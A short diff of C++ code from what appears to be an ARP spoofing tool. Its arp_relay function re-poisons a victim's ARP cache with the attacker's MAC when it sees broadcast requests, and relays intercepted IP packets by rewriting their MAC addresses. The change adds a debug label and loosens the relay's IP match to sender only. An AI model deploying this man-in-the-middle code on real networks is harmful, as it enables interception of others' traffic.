@@ -290,7 +290,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
         if (ethhdr->type() == EthHdr::Arp) {
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt ARP request
-            cout << string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
+            cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
             if (ethhdr->dmac() == Mac::broadcastMac() && arp_pkt->op() == ArpHdr::Request)
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
@@ -311,7 +311,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             IpHdr* iphdr = reinterpret_cast<IpHdr*>(buf.get() + sizeof(EthHdr));
             cout << string(iphdr->sip()) << " ?= " << string(sender_ip) << endl;
             cout << string(iphdr->dip()) << " ?= " << string(target_ip) << endl;
-            if ((iphdr->sip()) == sender_ip && iphdr->dip() == target_ip)
+            if ((iphdr->sip()) == sender_ip)
             {
                 eth->smac_ = attack_mac;
                 eth->dmac_ = target_mac;
